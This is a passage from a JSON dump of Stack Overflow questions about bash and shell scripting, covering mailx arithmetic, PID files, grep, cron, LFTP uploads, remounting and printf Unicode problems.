pidfile showing wrong process id","body":"<p>I've got a really simple wrapper script to start a ruby program that monitors a network connection. The script's on router - hence we're using ash, not bash.</p>\n\n<p>Since we're using monit to monitor the status, I need a PID file. The problem is, the process id set by the wrapper is one less than the ruby program.</p>\n\n<p>Monit therefore spans hundreds of processes. How can I get the wrapper to start the ruby program and create the correct pidfile?</p>\n\n<p>My wrapper looks like this:</p>\n\n<pre><code>#!/bin/sh /etc/rc.common\n  start(){\n    echo $$ &gt; /var/run/ping.pid\n    ruby /etc/scripts/ping.rb &amp; &gt; /dev/null 2&gt;&amp;1\n  }\n  stop(){\n    kill `cat /var/run/ping.pid`\n}\n</code></pre>\n"},{"tags":["bash","shell","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12698371,"title":"Expression not getting evaluated in shell script","body":"<pre><code>TEST1=`echo $QUERY_DAYS3 | awk '{print $1}'`\necho $TEST1\n\nTEST2=`echo $QUERY_DAYS3 | awk '{print $2}'`\necho $TEST2\n\nmailx -s \"Data Report\" -r uname@host.com uname@host.com &lt;&lt;EOF\n\nError Percentage: $((100 * ($TEST2/ $TEST1)))\n\nEOF\n</code></pre>\n\n<p>In my bash Shell script I have the above code from which I am sending email. But when I check my email I always see <code>Error Percentage</code> written like as it is written in my above code. It is not evaluating the multiplication and division expression.</p>\n\n<p>I am running the above script like this-</p>\n\n<pre><code>sh -x test1.sh\n</code></pre>\n\n<p>In the email I get like this-</p>\n\n<pre><code>Error  Percentage: $((100 * (183563 / 3793277)))\n</code></pre>\n\n<p>I am running <code>SunOS</code>.</p>\n\n<p>May be I need to use <code>Back-Ticks</code> here?</p>\n\n<p><strong>Update:-</strong></p>\n\n<p>My updated script that I am using currently-</p>\n\n<pre><code>TEST1=`echo $QUERY_DAYS3 | awk '{print $1}'`\necho $TEST1\n\nTEST2=`echo $QUERY_DAYS3 | awk '{print $2}'`\necho $TEST2\n\nmailx -s \"Data Report\" -r uname@host.com uname@host.com &lt;&lt;EOF\n\nError Percentage: $(( 100 * $TEST2 ) / $TEST1)\n\nEOF\n</code></pre>\n\n<p>I am running it like this below-</p>\n\n<pre><code>sh -c 'exec ./test.sh'\n</code></pre>\n\n<p>After trying the suggestion given by lot of peoples. I am getting this error-</p>\n\n<pre><code>./test.sh: command substitution: line 176: syntax error near unexpected token `/'\n./test.sh: command substitution: line 176: `( 100 * $TEST2 ) / $TEST1'\n</code></pre>\n\n<p>What wrong I am doing now? Any thoughts?</p>\n\n<p><strong>Update:-</strong></p>\n\n<p>After making changes, it start working-</p>\n\n<pre><code>Mismatch  Percentage: $((( 100 * $TEST2 ) / $TEST1))\n</code></pre>\n\n<p>But in the email, the percentage I get was rounded to only one figure like <code>4</code> only instead of showing as <code>4.34563235</code> How can I get full numbers instead of getting rounded off to one digit.?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12700507,"title":"Bash proper way of printing out an error message","body":"<p>Is this line the best way to print out an error message in Bash?</p>\n\n<pre><code>echo 'Error: banana' &gt;&amp;2\n</code></pre>\n\n<p>I need to update tens of Bash scripts which use all different ways of logging errors and I might as well choose the \"right\" way to do this and adhere to a standard as I do it...</p>\n"},{"tags":["bash","shell","mailx"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12702840,"title":"HTML formatted email using bash shell script","body":"<p>This is my below script which is working fine as it send only plain text email. </p>\n\n<p>So My question is- How can I modify my below script to send this as an HTML formatted email? I want to show the text color of this expression <code>(echo \"100*$TEST2/$TEST1\" | bc -l)</code> as <code>RED</code> in an email and that can be done only in HTML formatted emails. So that is the reason I was thinking to send an email in HTML formatted way. Any suggestions will be of great help.</p>\n\n<pre><code>#!/bin/bash\n\nTEN_DAYS=\"3793274 230667\"\n\nTEST1=`echo $TEN_DAYS | awk '{print $1}'`\necho $TEST1\n\nTEST2=`echo $TEN_DAYS | awk '{print $2}'`\necho $TEST2\n\nmailx -s \"Report\" -r uname@host.com uname@host.com &lt;&lt;EOF\n\nError  Percentage: `(echo \"100*$TEST2/$TEST1\" | bc -l)`\n\nEOF\n</code></pre>\n"},{"tags":["bash","floating-point"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12702185,"title":"float numbers in bash shell script","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12147040/division-in-script-and-floating-point\">Division in script and floating-point</a>  </p>\n</blockquote>\n\n\n\n<pre><code>Mismatch  Percentage: $((( 100 * $TEST2 ) / $TEST1))\n</code></pre>\n\n<p>I am trying to get float number from above code. I am using bash shell script. But the above code is not giving me float numbers. I guess bash does not support floating numbers</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12702471,"title":"Bash Script - Scope of variables in while loop","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7719548/bash-script-variable-scope-in-do-while-loop\">Bash Script - Variable Scope in Do-While loop</a>  </p>\n</blockquote>\n\n\n\n<p>In the following code, it prints the correct value of <code>i</code> in inner while loop, but it prints 0 after it comes out of inner while loop:</p>\n\n<pre><code>string=\"Medicine\"\nfor file in *\ndo\n    i=0\n    cat $file | while read line\n    do\n        echo $line\n        if [ \"$line\" == \"$string\" ];\n        then\n            i=`expr $i + 1`\n            echo $i\n        fi\n    done\n    echo $i\ndone\n</code></pre>\n"},{"tags":["bash","shell","awk"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":102,"score":3,"question_id":12690085,"title":"shell script: check directory name and convert to lowercase","body":"<p>I would like my bash script to check the name of the directory where it is run. Something like:</p>\n\n<pre><code>#!/bin/bash\n\npath=eval 'pwd'\n\ndirname=eval 'basename $path'\n</code></pre>\n\n<p>But it doesn't work: I get </p>\n\n<pre><code>./foo.sh: line 5: basename $path: command not found\n</code></pre>\n\n<p>How can I fix it? Also, once I get dirname to contain the correct dirname, I'd like to convert it to lowercase, to test it. I'm able to do this on the command line with awk:</p>\n\n<pre><code>echo $dirname | awk '{print tolower($0)}'\n</code></pre>\n\n<p>but how do I capture the return value into a variable? Thank you in advance,</p>\n\n<p>Best Regards</p>\n\n<p>Sergio</p>\n"},{"tags":["regex","linux","bash","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12701036,"title":"grep only area in between two strings","body":"<p>I'm having this problem where in trying to grep something on an html page (specifically a user name) I try to retrieve the string by saying:</p>\n\n<pre><code>egrep -o dir\\=\\\"[ltr]*\\\"\\&gt;.*(\\&lt;\\/span|\\&lt;\\/a)\n</code></pre>\n\n<p>By this I am trying to say: \"get anything after dir=(\"ltr or rlt\")> and before the first <code>&lt;/a&gt;</code> or <code>&lt;/span&gt;</code> closing tag. </p>\n\n<p>so for example:</p>\n\n<pre><code>dir=\"ltr\"&gt;myusername&lt;/span&gt;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>dir=\"rtl\"&gt;myusername&lt;/a&gt;\n</code></pre>\n\n<p>There are however multiple span tags on one line, and it is not stopping after the first one, which results in data that I don't want.</p>\n\n<p>Is there a way to modify my current regex to stop after the first one?  And why does it even continue reading?</p>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash","shell","sh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":36,"score":-2,"question_id":12701044,"title":"How to move all files in a directory that have a specific prefix?","body":"<p>I'm creating an <code>sh</code> script file to move files from a folder to another, but only move files starting with <code>system@</code>.</p>\n\n<p>So how can I move only the files that start with <code>system@</code>?</p>\n\n<pre><code>#pseudo-code\nforeach file \"system@*.*\" in dir\nmove to /.../...\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":["bash","shell","mailx"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":92,"score":-2,"question_id":12682837,"title":"Multiplication in shell script while sending mail using mailx","body":"<pre><code>mailx -s \"Report for $DATE_TENDAYS_FORMAT1\" -r uname@host.com uname@host.com &lt;&lt;EOF\n\nTotal Items Purchased as per EDW: `echo $QUERY_TEN_DAYS3 | awk '{print $1}'`\n\nTotal Items Missing or Mismatch : `echo $QUERY_TEN_DAYS3 | awk '{print $2}'`\n\nMismatch  Percentage: `100*((echo $QUERY_TEN_DAYS3 | awk '{print $2}')/(echo $QUERY_TEN_DAYS3 | awk '{print $1}'))`\n\nEOF\n</code></pre>\n\n<p>Whenever I try to send an email using <code>mailx</code> with the above syntax, I always get error on third line <code>(Mismatch Percentage) on * sign</code>. Anything wrong I am doing in the multiplication process in third line?</p>\n\n<p><strong>Update:-</strong></p>\n\n<pre><code>TEST1=`echo $QUERY_TEN_DAYS3 | awk '{print $1}'`\necho $TEST1\n\nTEST2=`echo $QUERY_TEN_DAYS3 | awk '{print $2}'`\necho $TEST2\n\nmailx -s \"Report for $DATE_TENDAYS_FORMAT1\" -r uname@host.com uname@host.com &lt;&lt;EOF\nComparison using previous day’s data\n\n******************************************\n\nMismatch  Percentage: $((100 * ($TEST2/ $TEST1)))\n\nEOF\n</code></pre>\n\n<p>I have tried the above code and still it gives me error on the first line as <code>( unexpected</code>. Any thoughts why is it happening?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12700463,"title":"Bash, how to visually distinguish stdout from stderr?","body":"<p>I need to visually distinguish, at a glance, stdout output from stderr output coming from a Bash script I am debugging.</p>\n\n<p>Can I pipe the command through some \"visualisation enhancer\" UNIX filter that would at least colour stderr \"red\", if not even prepend some tag to each stderr line?</p>\n"},{"tags":["git","bash","github","terminal","environment-variables"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12700483,"title":"How to obtain github \"short\" username at the command line?","body":"<p>So if.. </p>\n\n<pre><code>$ git config user.name\n↳ Alex Gray              # OK (my name)\n$ git config user.email\n↳ alex@mrgray.com        # OK (my email).\n</code></pre>\n\n<p>and..</p>\n\n<pre><code>GithubUserForProject() {  # in pwd\n    ORIGIN=$(git config --get remote.origin.url) &amp;&amp; echo $ORIGIN\n    OWNER=${ORIGIN%/*}     &amp;&amp; echo $OWNER  # trim URL tail\n    OWNER=${OWNER#*.com/}  &amp;&amp; echo $OWNER  # trim URL head\n    OWNER=${OWNER#*:}      &amp;&amp; echo $OWNER  # trim ssh URL head\n}\n\n$ cd /local/git/MyGitHubRepo &amp;&amp; GithubUserForProject\n↓ git@github.com:mralexgray/MyGitHubRepo.git\n↓ git@github.com:mralexgray\n↳ mralexgray            # OK (my username, but skanky way of finding it) \n</code></pre>\n\n<p>but...</p>\n\n<pre><code>$ cd /local/git/SomeGuysProject &amp;&amp; GithubUserForProject\n↓ git://github.com/someguy/SomeGuysProject.git\n↓ git://github.com/someguy\n↳ someguy              # WRONG! (cloned repo's user!)\n</code></pre>\n\n<p>So, how <strong>can</strong> I determine my github \"short username\" programmatically, either from the <code>env</code>ironment, a github API request, etc., <em>or otherwise</em> (via a script or terminal session?</p>\n"},{"tags":["regex","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12700228,"title":"LFTP Put file in specific directory?","body":"<p>I'm working on the following bash script that I need to upload specific files that are over 10 MB:</p>\n\n<pre><code>#!/bin/sh\n\nFTP_HOST=ftp.ftphost.com\nFTP_USER=myftpuser\nFTP_PASS=securepassword\n\n[[ -n \"$1\" ]] || { echo \"Usage: findlarge [PATHNAME]\"; exit 0 ; }\nFILES=`find \"$1\" -type f -size +10000k -printf '%p;'`\n\nOLD_IFS=\"$IFS\"\nIFS=\";\"\nFILES_ARRAY=( $FILES )\nIFS=\"$OLD_IFS\"\n\nfor fl in \"${FILES_ARRAY[@]}\"\n do\n   INVERSE=`${fl//\\/var\\/www\\/html/\\/public_html}`\n   lftp -u $FTP_USER,$FTP_PASS -e \"cd '${INVERSE}'; put '${fl}';quit\" $FTP_HOST\n done\n</code></pre>\n\n<p>It's used for a specific CDN that needs larger files uploaded to their servers what it's attempting to do and where I don't know how to continue is the files on the host side are found at <code>/var/www/html/</code> but the remote server needs them placed at <code>/public_html/</code>. I need the same file structure on the remote server as I do on the host server.</p>\n\n<p>The issue that I'm running into is <code>$INVERSE</code> still includes the actual file name and the path.. I need a way to trim off the filename from the INVERSE variable so I can properly place files in the correct directory.</p>\n\n<p>Does anybody know of a regex statement that can take something like:</p>\n\n<pre><code>/public_html/path/to/file/filename.zip\n</code></pre>\n\n<p>and change it to</p>\n\n<pre><code>/public_html/path/to/file/\n</code></pre>\n"},{"tags":["linux","bash","shell","wget"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12664534,"title":"Idealised wget download & install process","body":"<p>I am trying to work out the proper process of installing with Wget, in this example I'll use Nginx.</p>\n\n<pre><code># Download nginx to /tmp/ directory\nwget http://nginx.org/download/nginx-1.3.6.tar.gz -r -P /tmp\n\n# Extract nginx into /tmp/nginx directory\ntar xzf nginx-1.3.6.tar.gz -C /tmp/nginx\n\n# Configure it to be installed in opt\n./configure --prefix=/opt/nginx\n\n# Make it\nmake\n\n# Make install\nmake install\n\n# Clean up temp folder\nrm -r /tmp/*\n</code></pre>\n\n<p>Is this the idealised process? Is there anything I can improve on?</p>\n"},{"tags":["bash","character"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12697120,"title":"Characters out of order?","body":"<p>I made a short test because it seems the colon character <code>:</code> is out of order. The script prints the characters and clearly the colon comes after the <code>9</code>, but after running string tests it looks to actually come after the forward slash <code>/</code>. What gives?</p>\n\n<pre><code>$ cat chartest.sh\n#!/bin/sh\necho $LANG\n\nfor i in {33..126}; do\n  printf -v hex \"%x\" \"$i\"\n  printf \"\\x$hex\"\ndone\n\necho\n[[ : &gt; 9 ]] &amp;&amp; echo true || echo false\n[[ : &gt; / ]] &amp;&amp; echo true || echo false\n\n$ ./chartest.sh\nen_US.UTF-8\n!\"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnop\nqrstuvwxyz{|}~\nfalse\ntrue\n</code></pre>\n\n<h1>Edit</h1>\n\n<p>I found if I use the old test function it works correctly</p>\n\n<pre><code>$ [ : \\&gt; 9 ] &amp;&amp; echo true || echo false\ntrue\n</code></pre>\n\n<p>Also relevant</p>\n\n<p><a href=\"http://tiswww.case.edu/php/chet/bash/COMPAT\" rel=\"nofollow\">http://tiswww.case.edu/php/chet/bash/COMPAT</a></p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1510,"score":3,"question_id":5098591,"title":"read: Illegal option -d","body":"<p>Here is the offending part of my script:</p>\n\n<pre><code>read -d '' TEXT &lt;&lt;'EOF'\nSome Multiline\ntext that\nI would like\nin \na \nvar\nEOF\n\necho \"$TEXT\" &gt; ~/some/file.txt\n</code></pre>\n\n<p>and the error:</p>\n\n<pre><code>read: 175: Illegal option -d\n</code></pre>\n\n<p>I use this read -d all over the place and it works fine. Not sure why its not happy now. I'm running the script on Ubuntu 10.10</p>\n\n<p>Fixes? Workarounds?</p>\n"},{"tags":["javascript","bash","jsp","tomcat"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12699025,"title":"executing a bash script from a jsp page","body":"<p>I have previously written a bash script that executes a java class, it does other checks before running that class.\nwhen running it takes arguments; <code>./SyncIPs.cmd 10.0.1.45</code> and executes few commands.</p>\n\n<p>I am trying to run this script in a jsp page using a html/javascript button. I have so far, two jsp files as follows:</p>\n\n<p>portal.jsp:</p>\n\n<pre><code>      &lt;%\n      if(request.getParameter(\"submitted\")==null)\n  {\n\n    if(check)\n    {\n\n        %&gt;&lt;%@include file=\"Sync.jsp\" %&gt;&lt;%\n    }\n    else\n    {\n\n        %&gt;&lt;%@include file=\"Sync.jsp\" %&gt;&lt;%\n    }   \n }\n     %&gt;\n</code></pre>\n\n<p>Sync.jsp:</p>\n\n<pre><code>   &lt;%\n   if(request.getParameter(\"submit\") == null)\n   {\n\n   %&gt;\n    &lt;div class=display&gt;this is the Sync&lt;/div&gt;\n\n    &lt;/div&gt;\n\n    &lt;br&gt;\n    &lt;form method=\"POST\" action=\"/project/jsp/Portal.jsp\" id=form2&gt;\n\n\n  &lt;input type=hidden name=sync&gt;\n      &lt;!---this is where I want my script to be run from,---&gt;\n\n   &lt;input type=\"button\" value=\"\" name=\"submit\" action=\"run\" \n   onClick=\"if(runOnSubmit()){getSomethingWithAjax\n   ('Portal.jsp'+getAllFormElementsAndMakeIntoURI(true),\n   '','hereIsTheMainHeaderSpan',false,false);}\"&gt;\n   &lt;%\n   }//end if\n   %&gt;\n</code></pre>\n\n<p>How do I get this script to run and get posted on the portal.jsp page?</p>\n"},{"tags":["php","linux","bash","cron"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12698131,"title":"Trouble running a bash script with crontab","body":"<p>I have a bash script that checks to see if my PHP service is running, and starts it if needed.</p>\n\n<pre><code>#!/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nKP=$(pgrep -P 1 -f script.php)\nif [ \"X$KP\" = \"X\" ]\n    then\n        /usr/bin/nohup php /var/www/test/script.php &gt;&gt;/var/www/test/log.txt 2&gt;&amp;1 &amp;\nfi\n</code></pre>\n\n<p>I then added the following entry to <code>crontab -e</code> (as my user).</p>\n\n<pre><code>* * * * * /var/www/test/startup &gt;&gt; /var/www/test/cron.log 2&gt;&amp;1 &amp;\n</code></pre>\n\n<p>The cron runs, and I can see the process when looking at <code>htop</code>. However, it doesn't seem to be working or writing to the logs. It just sits there using 0% of the CPU. the <code>/var/www/test/</code> folder is owned by my and the log files have <code>666</code> permissions.</p>\n\n<p>What is wrong? Or rather, what can I change to get the error logs working so I know what's wrong?</p>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12699174,"title":"Bash folder lists with spaces?","body":"<p>I have the following code to find specific files that are over 10 MB:</p>\n\n<pre><code>[[ -n \"$1\" ]] || { echo \"Usage: findlarge [PATHNAME]\"; exit 0 ; }\nFILES=`find $1 -type f -size +10000k -exec ls -lh {} \\; | awk '{ print $9 \";\" }'`\n\necho -ne $FILES\n</code></pre>\n\n<p>It works quite well until it runs into a file path that has a space in it. So for example I have a folder that has a large file in it at <code>/var/www/html/Web Content/largefile.zip</code> but the script will only return <code>/var/www/html/Web</code>.</p>\n\n<p>Any ideas how to fix that?</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":390,"score":0,"question_id":6594085,"title":"Remove first character of a string in Bash","body":"<p>I need to calculate md5sum of one string (pathfile) per line in my <code>ls</code> dump, <code>directory_listing_file</code>:</p>\n\n<pre><code>./r/g4/f1.JPG\n./r/g4/f2.JPG\n./r/g4/f3.JPG\n./r/g4/f4.JPG\n</code></pre>\n\n<p>But that md5sum should be calculated  without the initial dot.\nI've written a simple script:</p>\n\n<pre><code>while read line\ndo\n    echo $line | exec 'md5sum'\ndone\n\n./g.sh &lt; directory_listnitg.txt\n</code></pre>\n\n<p>How do I remove the first dot from each line?</p>\n"},{"tags":["qt","bash","curl","qprocess","chown"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12697040,"title":"QProcess executing bash chown","body":"<p>I built a command line qt solution which either gets via CURL a certain package, or from a certain directory, unzips it, and installs its contents according to a predefined struture.</p>\n\n<p>After it downloads, unzips, and places all the files and folder in the places they are supposed to, I use a QProcess to execute a post-install.sh file that comes along with the package.</p>\n\n<p>When set the solution to download the package from a certain repo via curl, the post-install.sh is executing just fine, but when I request it to do from a local .ZIP file, whereas the post-install.sh is executing via QProcess, it's not doing what it's supposed to.</p>\n\n<p>The post-install.sh is pretty simple, it performs a 'chown' command on the main folder ( all its contents ) it downloaded and installed. </p>\n\n<p>I see it's a problem with permissions, but I cannot see where. For I execute the command line program as SUDO, and it works fine ( the post-install.sh ) when instead of requesting it to open a local .ZIP file, I ask it to download via CURL from a repo.</p>\n\n<p>Any ideas on that one?</p>\n\n<p>Thanks a lot in advance!</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":12693970,"title":"Print unicode hex code which is part of basic latin as a symbol in Bash","body":"<p>I have a list containing a mix of symbols and unicode numbers (all of length four), of which some are part of basic latin. I want to print them all as symbols.</p>\n\n<p>An example of my failed attempt using Bash (under Cygwin):</p>\n\n<pre><code>list=\"0 3 4 5 005e 0060 00ff\"\n$ for c in $list; do [[ ${#c} = 4 ]] &amp;&amp; env printf \"\\\\u$c\\n\" || echo $c; done\n0\n3\n4\n5\nprintf: invalid universal character name \\u005e\n005e\n`\nÿ\n</code></pre>\n\n<p>I get the same problem regardless of locale and encoding in the terminal.</p>\n\n<p>I can not get the answer for this problem from askununtu to work: <a href=\"http://askubuntu.com/questions/20806/why-does-printf-report-an-error-on-all-but-three-ascii-range-unicode-codepoint\">http://askubuntu.com/questions/20806/why-does-printf-report-an-error-on-all-but-three-ascii-range-unicode-codepoint</a></p>\n"},{"tags":["regex","bash"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":282,"score":3,"question_id":9792702,"title":"does bash support word boundary regular expressions?","body":"<p>I am trying to match on the presence of a word in a list before adding that word again (to avoid duplicates). I am using bash 4.2.24 and am trying the below:</p>\n\n<pre><code>[[  $foo =~ \\bmyword\\b ]]\n</code></pre>\n\n<p>also</p>\n\n<pre><code>[[  $foo =~ \\&lt;myword\\&gt; ]]\n</code></pre>\n\n<p>However, neither seem to work. They are mentioned in the bash docs example: <a href=\"http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_04_01.html\" rel=\"nofollow\">http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_04_01.html</a>.</p>\n\n<p>I presume I am doing something wrong but I am not sure what. Any guidance appreciated...</p>\n"},{"tags":["osx","bash","vba","excel-vba-mac"],"answer_count":4,"favorite_count":2,"up_vote_count":10,"down_vote_count":0,"view_count":662,"score":10,"question_id":11042473,"title":"How to call a Bash script from VBA (Excel)","body":"<p>How can I run a <code>bash</code> file using VBA on MAC OSX </p>\n\n<p>I tried the following code</p>\n\n<pre><code>location = FolderPath(ThisWorkBook.FullName) \n</code></pre>\n\n<p>which returns the current directory minus the file name.  </p>\n\n<p>followed by </p>\n\n<pre><code>Shell(location &amp;\"runmybatch.sh\")\n</code></pre>\n\n<p>I did this because the bash script is located within the same folder as the excel spreadsheet.  </p>\n"},{"tags":["bash","signals","nohup"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":93,"score":0,"question_id":12695770,"title":"Use \"nohup\" to run \"top\" command in background","body":"<p>I have problems in using nohup to run top command in the background. First, I run it locally, as</p>\n\n<pre><code>nohup top &amp;\n</code></pre>\n\n<p>it complains in <code>nohup.out</code> with text <code>top: failed to get tty</code>. My ultimate goal is to run top on remote machine, like </p>\n\n<pre><code>nohup ssh -t user@hostname top &amp;\n</code></pre>\n\n<p>currently, the above command also fails with </p>\n\n<pre><code>Pseudo-terminal will not be allocated because stdin is not a terminal.^M \nTERM environment variable not set\n</code></pre>\n\n<p>Any ideas?</p>\n\n<p>PS: I run this command to ping <code>machineB</code> from <code>machineA</code>. <code>machineA</code> is always alive, but not not always logged in.</p>\n"},{"tags":["bash","sed","grep"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":12688437,"title":"Bash - extract url from xml file","body":"<p>I have this file (dev1.temp):</p>\n\n<pre><code> &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;krpano version=\"1.0.8.15\" showerrors=\"false\"&gt;\n\n          &lt;include url=\"include/sa/index.xml\" /&gt; &lt;include url=\"content/sa.xml\" /&gt;\n          &lt;include url=\"include/global/index.xml\" /&gt;\n          &lt;include url=\"include/orientation/index.xml\" /&gt;\n          &lt;include url=\"include/movecamera/index.xml\" /&gt; &lt;include url=\"content/movecamera.xml\" /&gt;\n          &lt;include url=\"include/fullscreen/index.xml\" /&gt;\n          &lt;include url=\"include/instructions/index.xml\" /&gt;\n          &lt;include url=\"include/coordfinder/index.xml\" /&gt;\n          &lt;include url=\"include/editor_and_options/index.xml\" /&gt;\n&lt;/krpano&gt;\n</code></pre>\n\n<p>The goal is to get all the url's content and put them in a temp file (devel.temp). The output would be:</p>\n\n<pre><code>include/sa/index.xml\ncontent/sa.xml\ninclude/global/index.xml\ninclude/orientation/index.xml\ninclude/movecamera/index.xml\ncontent/movecamera.xml\ninclude/fullscreen/index.xml\ninclude/instructions/index.xml\ninclude/coordfinder/index.xml\ninclude/editor_and_options/index.xml\n</code></pre>\n\n<p>To do the trick I have the following script:</p>\n\n<pre><code># Make a temp file with all the files url's    \ngrep -o 'url=['\"'\"'\"][^\"'\"'\"']*['\"'\"'\"]' $temp_folder\"/devel1.temp\" &gt; $temp_folder\"/devel2.temp\"\n# Strip off everything to leave just the url's'    \nsed -e 's/^url=[\"'\"'\"']//' -e 's/[\"'\"'\"']$//' $temp_folder\"/devel2.temp\" &gt; $temp_folder\"/devel.temp\"\n</code></pre>\n\n<p>Yesterday it worked perfectly. Today, devel2.temp and devel.temp output is this:</p>\n\n<pre><code>[01;31m[Kurl=\"include/sa/index.xml\"[m[K\n[01;31m[Kurl=\"content/sa.xml\"[m[K\n[01;31m[Kurl=\"include/global/index.xml\"[m[K\n[01;31m[Kurl=\"include/orientation/index.xml\"[m[K\n[01;31m[Kurl=\"include/movecamera/index.xml\"[m[K\n[01;31m[Kurl=\"content/movecamera.xml\"[m[K\n[01;31m[Kurl=\"include/fullscreen/index.xml\"[m[K\n[01;31m[Kurl=\"include/instructions/index.xml\"[m[K\n[01;31m[Kurl=\"include/coordfinder/index.xml\"[m[K\n[01;31m[Kurl=\"include/editor_and_options/index.xml\"[m[K\n</code></pre>\n\n<p>Any ideas about what's going on?</p>\n"},{"tags":["linux","bash","shell","unix","aix"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12695580,"title":"what is the proper syntax for calling Porperty in shell","body":"<p>I'm trying to run the following script:</p>\n\n<pre><code>#!/bin/sh\n. ./test.prop\n\nfor ((i=0; i&lt;10;i++)\ndo\n    echo $F($i)\ndone  \n</code></pre>\n\n<p>The file it sources contains parameter assignments:</p>\n\n<pre><code>F1=20\nF2=30\nF3=40\n.\n.\n.\n</code></pre>\n\n<p>The desired output of the script would be</p>\n\n<pre><code>10\n20\n30\n40\n.\n.\n.\n</code></pre>\n\n<p>What is the proper syntax for <code>$F($i)</code>? or I just can't simply use it?</p>\n"},{"tags":["bash","virtualenv","virtualenvwrapper","virtualenv-commands"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12647779,"title":"Postactivate script for auto-changing to project directory","body":"<p>I have a one-line entry in my virtualenv <code>postactivate</code> script which notifies my of which virtualenv I'm in:</p>\n\n<pre><code>export PS1=\"\\[\\033[40;1;36m\\](`basename $VIRTUAL_ENV`)\\[\\033[00m\\]\\[\\033[01;34m\\] \\W\\[\\033[00m\\] \\$ \"\n</code></pre>\n\n<p>I want to add a line which will also change into the directory of my project when I issue the workon command. This is only for me really, so I am happy to issue the command <code>workon myproject</code> and use myproject as the only variable and then change to <code>/path/to/projects/myproject</code>. This will work as all my projects are in the same directory. To demonstrate:</p>\n\n<pre><code>cd ~/projects/django-projects/$1\n</code></pre>\n\n<p>Would work, but of course the command variable is actually <code>post_activate</code>. Can I easily grab the string from the command line and pass it to this script?</p>\n\n<p>Any help much appreciated.</p>\n"},{"tags":["bash","unix","cron","mount"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12694848,"title":"remounting file system as rw in unix bash script","body":"<p>Hi all I need to remount a file system as read/write in a bash script</p>\n\n<p>I've looked at several examples and my code looks right..in fact its working. However when I execute the bash file as root it still asks to enter a password. I can't do this as it is going to be run as a CRON job when I'm out of the office. I've tried several variations and  none work. Do you guys have any suggestions?</p>\n\n<pre><code>$MOUNT -o remount,rw $BACKUPDIR ;\nif (( $? )); then\n{\n$ECHO \"snapshot: could not remount $BACKUPDIR readwrite\";\nexit;\n}\n</code></pre>\n\n<p>fi;</p>\n"},{"tags":["regex","bash","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12691511,"title":"How to list files with numbers in their name and retrieve the numbers?","body":"<p>I am very new to regex, therefore I do imagine this is quite a simple question to answer and must have been asked several times already, but unfortunly I can't find any of those answers.</p>\n\n<p>Given a directory, I need the list of all of its subdirectories whose names respect the pattern \"nw=[number].a=[number]\", and for every directory I need to retrieve those numbers and do a few things based on those. Some of these directories are nw=82.a=40, nw=100.a=9, ecc.</p>\n\n<p>My guess to accomplish this would be</p>\n\n<pre><code>#! /bin/bash\n\ncd $mydir\nfor dir in `ls | grep 